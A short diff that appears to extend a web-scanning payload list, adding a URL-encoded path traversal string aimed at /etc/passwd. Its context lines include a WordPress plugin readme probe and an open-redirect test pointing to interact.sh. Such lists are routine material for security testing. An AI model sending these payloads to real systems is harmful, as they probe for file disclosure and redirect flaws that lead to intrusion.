@@ -12,3 +12,4 @@
 /etc/passwd
 /wp-content/plugins/user-registration/readme.txt
 /?user-logout=true&redirect_to_on_logout=https://interact.sh
+/plugins/..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
